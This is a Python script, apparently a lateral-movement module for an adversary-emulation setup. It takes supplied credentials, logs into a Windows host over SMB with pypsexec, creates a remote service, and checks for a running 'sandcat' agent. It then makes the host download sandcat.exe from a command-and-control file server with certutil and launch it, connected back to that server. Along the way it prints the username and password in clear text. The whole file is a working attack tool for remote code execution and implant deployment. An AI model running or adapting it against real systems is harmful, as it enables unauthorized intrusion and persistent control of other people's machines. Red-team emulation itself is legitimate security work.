import argparse, subprocess
from pypsexec.client import Client
from sys import exit

parser = argparse.ArgumentParser()
parser.add_argument('--target', required=True)
parser.add_argument('--cred', required=False)
parser.add_argument('--domain_cred', required=False)
parser.add_argument('--server', required=True)
args = parser.parse_args()

# Not SMB
if '445' not in args.target:
    exit(1)

target_ip = args.target.split(':')[0]

if args.cred:
    creds = args.cred.split(':')
    ip = creds[0]
    user = creds[2]
    pw = creds[3]
    if ip != target_ip:
        print(f"target does not match credential {ip} / {target_ip}")
        exit(0)

elif args.domain_cred:
    creds = args.domain_cred.split(':')
    user = f'{creds[1]}@{creds[0]}'
    pw = creds[2]
    ip = target_ip

# file server is on port 8000 not 8888
file_server = args.server[:-3]+"000/sandcat.go-windows"

# psexec client
print(f"ip: {ip}\tuser: {user}\tpw{pw}")
client = Client(ip, username=user, password=pw, encrypt=False)

try:
    # connect to client
    client.connect()
    client.create_service()

    stout, sterr, pid = client.run_executable("cmd.exe",
                                              arguments="/c tasklist")

    if b"sandcat" in stout:
        print("sandcat is already running")
        exit(0)

    # tell remote system to download sandcat from C2
    client.run_executable("certutil.exe", arguments=f"-urlcache -split -f {file_server} C:\\Users\\Public\\sandcat.exe")

    # start remote process
    stout, sterr, pid = client.run_executable("cmd.exe",
                                              arguments=f"/c C:\\Users\\Public\\sandcat.exe -server {args.server} -group my_group",
                                              asynchronous=True)

except Exception as e:
    print(f"Exception {e}")

if pid:
    print("success")
    exit(0)
